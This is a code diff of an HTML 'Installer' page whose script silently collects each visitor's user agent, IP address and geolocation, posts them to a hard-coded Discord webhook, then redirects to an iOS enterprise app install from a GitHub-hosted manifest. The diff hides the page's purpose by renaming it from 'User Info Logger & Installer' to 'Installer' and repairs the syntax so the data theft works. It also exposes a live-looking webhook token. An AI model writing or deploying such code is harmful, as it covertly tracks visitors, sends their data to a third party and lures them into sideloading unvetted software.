@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>User Info Logger & Installer</title>
+  <title>Installer</title>
 </head>
 <body>
-  <h1>Logging & Prompting Install</h1>
+  <h1>Install</h1>
   <script>
     async function sendInfoAndInstall() {
       const userAgent = navigator.userAgent;
@@ -12,12 +12,19 @@
       let coords = "unknown";
 
       try {
-        const res = await fetch("https://ipapi.co/json/");
+        const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
         ip = data.ip || "unknown";
-        coords = Latitude: ${data.latitude}, Longitude: ${data.longitude};
       } catch (e) {
-        console.error("Geo/IP fetch failed:", e);
+        console.error("IP fetch failed:", e);
+      }
+
+      try {
+        const geo = await fetch("https://ipapi.co/json/");
+        const geoData = await geo.json();
+        coords = `Latitude: ${geoData.latitude}, Longitude: ${geoData.longitude}`;
+      } catch (e) {
+        console.error("Geo fetch failed:", e);
       }
 
       await fetch("https://discord.com/api/webhooks/1396597523963183206/owIYuIBgQW22F7OH_3msaO0w9ctvHmJvHby0S5dvQXBRzFNsiHgAkri02R6kyHX0BYJp", {
@@ -26,11 +33,10 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: User Agent: ${userAgent}\nIP: ${ip}\nCoords: ${coords}
+          content: `User Agent: ${userAgent}\nIP: ${ip}\nCoords: ${coords}`
         })
       });
 
-      // Redirect to installation URL
       window.location.href = "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/nexus-hub10/NEXUS-s-repo/refs/heads/main/TERMINAL.plist";
     }
 
@@ -38,4 +44,3 @@
   </script>
 </body>
 </html>
-
